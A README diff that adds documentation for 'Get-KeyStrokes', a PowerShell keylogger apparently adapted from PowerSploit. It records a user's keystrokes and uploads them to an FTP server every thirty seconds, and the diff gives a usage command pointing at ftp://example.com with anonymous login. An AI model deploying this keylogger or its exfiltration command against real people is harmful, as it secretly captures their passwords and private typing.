@@ -27,5 +27,15 @@ By default, Get-Artifacts (run without any arguments) outputs the artifacts coll
 that do not have two factor authentication enabled and have changed their Google settings to allow insecure app access
 * -Computers allows you to specify remote computer to connect to and gather this information from
 
+## Get-KeyStrokes
+This powershell script uses much of the work done by Chris Campbell and Matthew Graeber in their key logger script
+(which is part of their PowerSpolit Library). It logs a user's keystrokes and then sends the keystrokes to an ftp
+server every thirty seconds.
 
+### Usage
+`Get-KeyStrokes -FtpServer ftp://example.com`
+
+Logs in with anonymous/anonymous
+
+## Author
 Repository owner: Tom Daniels
